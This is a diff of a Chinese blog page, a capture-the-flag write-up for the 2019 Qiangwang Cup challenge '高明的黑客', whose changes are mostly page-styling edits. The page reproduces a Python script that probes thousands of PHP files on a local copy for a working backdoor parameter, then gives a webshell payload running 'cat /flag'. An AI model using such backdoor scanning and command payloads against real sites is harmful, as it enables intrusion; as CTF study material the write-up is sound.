@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      482 字
+      534 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      14
+      8
        分钟
     </span>
   
@@ -245,68 +238,74 @@
             <!-- SEO header -->
             <h1 style="display: none">BUU每日一题028</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="二十八、"><a href="#二十八、" class="headerlink" title="二十八、"></a>二十八、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]高明的黑客<br><img src="https://ae04.alicdn.com/kf/H0c5d474d5be84e36bf49ea28ff95588fv.jpg" srcset="/img/loading.gif" alt="02.png">      </p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<code>www.tar.gz</code>得到一个压缩包，里面有3002个PHP文件，<img src="https://ae04.alicdn.com/kf/Hf19fd81889a14126917af7acb6db6830p.jpg" srcset="/img/loading.gif" alt="03.png"><br>有shell，应该是只有一个是有效的吧，所以考的应该是python写脚本的能力了         </p>
 <h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102945940">大佬</a>的脚本      </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php">import os
+<div class="hljs"><pre><code><pre><code class="hljs php">import os
 import requests
 import re
 import threading
 import time
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'开始时间：  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span><span class="token function">asctime</span><span class="token punctuation">(</span> time<span class="token punctuation">.</span><span class="token function">localtime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
-s1<span class="token operator">=</span>threading<span class="token punctuation">.</span><span class="token function">Semaphore</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  							  			<span class="token shell-comment comment">#这儿设置最大的线程数</span>
-filePath <span class="token operator">=</span> r<span class="token double-quoted-string string">"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span>
-os<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>													<span class="token shell-comment comment">#改变当前的路径</span>
-requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span><span class="token constant">DEFAULT_RETRIES</span> <span class="token operator">=</span> <span class="token number">5</span>								<span class="token shell-comment comment">#设置重连次数，防止线程数过高，断开连接</span>
-files <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">listdir</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>
-session <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">Session</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean constant">False</span>											 <span class="token shell-comment comment"># 设置连接活跃状态为False</span>
-def <span class="token function">get_content</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s1<span class="token punctuation">.</span><span class="token function">acquire</span><span class="token punctuation">(</span><span class="token punctuation">)</span>												
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'trying   '</span><span class="token operator">+</span>file<span class="token operator">+</span> <span class="token single-quoted-string string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span><span class="token function">asctime</span><span class="token punctuation">(</span> time<span class="token punctuation">.</span><span class="token function">localtime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
-    with <span class="token function">open</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token single-quoted-string string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>							<span class="token shell-comment comment">#打开php文件，提取所有的$_GET和$_POST的参数</span>
-            gets <span class="token operator">=</span> <span class="token keyword">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token function">findall</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-            posts <span class="token operator">=</span> <span class="token keyword">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span><span class="token function">findall</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>														<span class="token shell-comment comment">#所有的$_POST</span>
-    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>														<span class="token shell-comment comment">#所有的$_GET</span>
-    <span class="token keyword">for</span> m in gets<span class="token punctuation">:</span>
-        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"echo 'xxxxxx';"</span>
-    <span class="token keyword">for</span> n in posts<span class="token punctuation">:</span>
-        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"echo 'xxxxxx';"</span>
-    url <span class="token operator">=</span> <span class="token single-quoted-string string">'http://127.0.0.1/src/'</span><span class="token operator">+</span>file
-    req <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>			<span class="token shell-comment comment">#一次性请求所有的GET和POST</span>
-    req<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>												<span class="token shell-comment comment"># 关闭请求  释放内存</span>
-    req<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token single-quoted-string string">'utf-8'</span>
-    content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
-    <span class="token shell-comment comment">#print(content)</span>
-    <span class="token keyword">if</span> <span class="token double-quoted-string string">"xxxxxx"</span> in content<span class="token punctuation">:</span>									<span class="token shell-comment comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span>
-        flag <span class="token operator">=</span> <span class="token number">0</span>
-        <span class="token keyword">for</span> a in gets<span class="token punctuation">:</span>
-            req <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token single-quoted-string string">'?%s='</span><span class="token operator">%</span>a<span class="token operator">+</span><span class="token double-quoted-string string">"echo 'xxxxxx';"</span><span class="token punctuation">)</span>
-            content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
-            req<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>												<span class="token shell-comment comment"># 关闭请求  释放内存</span>
-            <span class="token keyword">if</span> <span class="token double-quoted-string string">"xxxxxx"</span> in content<span class="token punctuation">:</span>
-                flag <span class="token operator">=</span> <span class="token number">1</span>
-                <span class="token keyword">break</span>
-        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
-            <span class="token keyword">for</span> b in posts<span class="token punctuation">:</span>
-                req <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">:</span><span class="token double-quoted-string string">"echo 'xxxxxx';"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-                content <span class="token operator">=</span> req<span class="token punctuation">.</span>text
-                req<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>												<span class="token shell-comment comment"># 关闭请求  释放内存</span>
-                <span class="token keyword">if</span> <span class="token double-quoted-string string">"xxxxxx"</span> in content<span class="token punctuation">:</span>
-                    <span class="token keyword">break</span>
-        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>													<span class="token shell-comment comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>
-            param <span class="token operator">=</span> a
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            param <span class="token operator">=</span> b
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'找到了利用文件： '</span><span class="token operator">+</span>file<span class="token operator">+</span><span class="token double-quoted-string string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span><span class="token function">asctime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">localtime</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    s1<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))
+s1=threading.Semaphore(<span class="hljs-number">100</span>)  							  			<span class="hljs-comment">#这儿设置最大的线程数</span>
+filePath = r<span class="hljs-string">&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span>
+os.chdir(filePath)													<span class="hljs-comment">#改变当前的路径</span>
+requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>								<span class="hljs-comment">#设置重连次数，防止线程数过高，断开连接</span>
+files = os.listdir(filePath)
+session = requests.Session()
+session.keep_alive = <span class="hljs-literal">False</span>											 <span class="hljs-comment"># 设置连接活跃状态为False</span>
+def get_content(file):
+    s1.acquire()												
+    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span>+file+ <span class="hljs-string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))
+    with open(file,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:							<span class="hljs-comment">#打开php文件，提取所有的$_GET和$_POST的参数</span>
+            gets = <span class="hljs-keyword">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))
+            posts = <span class="hljs-keyword">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))
+    data = &#123;&#125;														<span class="hljs-comment">#所有的$_POST</span>
+    params = &#123;&#125;														<span class="hljs-comment">#所有的$_GET</span>
+    <span class="hljs-keyword">for</span> m in gets:
+        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>
+    <span class="hljs-keyword">for</span> n in posts:
+        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>
+    url = <span class="hljs-string">&#x27;http://127.0.0.1/src/&#x27;</span>+file
+    req = session.post(url, data=data, params=params)			<span class="hljs-comment">#一次性请求所有的GET和POST</span>
+    req.close()												<span class="hljs-comment"># 关闭请求  释放内存</span>
+    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span>
+    content = req.text
+    <span class="hljs-comment">#print(content)</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> in content:									<span class="hljs-comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span>
+        flag = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">for</span> a in gets:
+            req = session.get(url+<span class="hljs-string">&#x27;?%s=&#x27;</span>%a+<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)
+            content = req.text
+            req.close()												<span class="hljs-comment"># 关闭请求  释放内存</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> in content:
+                flag = <span class="hljs-number">1</span>
+                <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:
+            <span class="hljs-keyword">for</span> b in posts:
+                req = session.post(url, data=&#123;b:<span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)
+                content = req.text
+                req.close()												<span class="hljs-comment"># 关闭请求  释放内存</span>
+                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> in content:
+                    <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:													<span class="hljs-comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span>
+            param = a
+        <span class="hljs-keyword">else</span>:
+            param = b
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="hljs-string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))
+    s1.release()
 
-<span class="token keyword">for</span> i in files<span class="token punctuation">:</span>															<span class="token shell-comment comment">#加入多线程</span>
-   t <span class="token operator">=</span> threading<span class="token punctuation">.</span><span class="token function">Thread</span><span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-   t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          </code></pre></code></pre>
+<span class="hljs-keyword">for</span> i in files:															<span class="hljs-comment">#加入多线程</span>
+   t = threading.Thread(target=get_content, args=(i,))
+   t.start()</code></pre></div></code></pre>
 <p>运行<br><img src="https://sc03.alicdn.com/kf/Hdef4496632754ec3885fb3bc8cfd8668W.jpg" srcset="/img/loading.gif" alt="04.png"><br>payload：<code>/xk0SzyKwfzw.php?Efa5BVG=cat /flag</code>得到flag<img src="https://ae02.alicdn.com/kf/H85c10a4376734c50af5ce78f50a844700.jpg" srcset="/img/loading.gif" alt="01.png"> </p>
 
             </div>
@@ -426,7 +425,7 @@ def <span class="token function">get_content</span><span class="token punctuatio
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -452,8 +451,6 @@ def <span class="token function">get_content</span><span class="token punctuatio
 
 
 
-  
-    
   
 
 
